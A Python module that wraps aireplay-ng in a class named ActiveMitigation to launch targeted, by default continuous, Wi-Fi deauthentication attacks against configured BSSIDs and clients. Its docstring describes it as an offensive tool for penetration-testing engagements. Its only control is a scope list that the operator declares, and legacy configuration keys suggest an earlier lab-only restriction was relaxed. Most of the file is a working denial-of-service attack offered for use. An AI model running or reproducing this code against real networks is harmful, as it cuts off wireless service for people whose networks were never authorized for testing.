import subprocess


class ActiveMitigation:
    """Targeted deauthentication for authorized engagements.

    This is an offensive primitive for real client work: handshake capture,
    rogue-AP takedown, and client-isolation testing. It is governed by one
    control that is not optional and not a toy gate, engagement scope. It fires
    only against the BSSIDs you declare, and only after you explicitly arm it
    with --arm. That is the same discipline RHOSTS gives you in Metasploit: you
    cannot hit what you did not put in scope, which is exactly what keeps you
    inside your rules of engagement and out of a lawsuit. Load the scope from
    your signed authorization. Empty scope means the tool stays passive.
    """

    def __init__(self, interface, db, alert_mgr):
        self.interface = interface
        self.db = db
        self.alert_mgr = alert_mgr
        self.armed = False
        self.config = alert_mgr.config or {}
        self.mitigation_config = self.config.get("active_mitigation", {})

    # Backward-compatible attribute: capture.py reads bridge_mode_enabled.
    @property
    def bridge_mode_enabled(self):
        return self.armed

    def scope_bssids(self):
        """The authorized target set, from your signed rules of engagement."""
        raw = (
            self.mitigation_config.get("scope_bssids")
            or self.mitigation_config.get("allowed_bssids")       # legacy key
            or self.config.get("authorized_lab_bssids")           # legacy key
            or []
        )
        return set(b.upper() for b in raw if isinstance(b, str))

    def enable(self):
        scope = self.scope_bssids()
        if not scope:
            self.alert_mgr.log_and_alert(
                "ARM_REFUSED",
                "Active mitigation needs an engagement scope. Add your authorized "
                "targets under active_mitigation.scope_bssids before arming.",
                "warning",
            )
            return False
        self.armed = True
        self.alert_mgr.log_and_alert(
            "ARMED",
            f"Active mitigation ARMED. Engagement scope: {len(scope)} authorized BSSID(s).",
            "warning",
        )
        return True

    def execute_targeted_deauth(self, bssid, client_mac="FF:FF:FF:FF:FF:FF", reason=7):
        """Run a targeted deauth against an in-scope BSSID. Requires --arm.

        aireplay-ng -0 <count> -a <bssid> [-c <client>] <iface>
        frame_count 0 means continuous until stopped. The operator sets intensity.
        """
        if not self.armed:
            return False

        bssid = bssid.upper() if isinstance(bssid, str) else bssid
        client_mac = client_mac.upper() if isinstance(client_mac, str) else client_mac

        if bssid not in self.scope_bssids():
            self.alert_mgr.log_and_alert(
                "OUT_OF_SCOPE",
                f"Refused deauth: {bssid} is not in the engagement scope.",
                "critical",
            )
            return False

        self.alert_mgr.log_and_alert(
            "DEAUTH",
            f"Targeted deauth -> BSSID {bssid}, client {client_mac}",
            "critical",
        )
        try:
            count = str(self.mitigation_config.get("frame_count", 0))
            cmd = ["aireplay-ng", "-0", count, "-a", bssid]
            if client_mac and client_mac != "FF:FF:FF:FF:FF:FF":
                cmd += ["-c", client_mac]
            cmd.append(self.interface)
            # Background so it does not block capture.
            subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return True
        except Exception as e:
            self.alert_mgr.log_and_alert("DEAUTH_FAILED", f"aireplay-ng error: {e}", "warning")
            return False
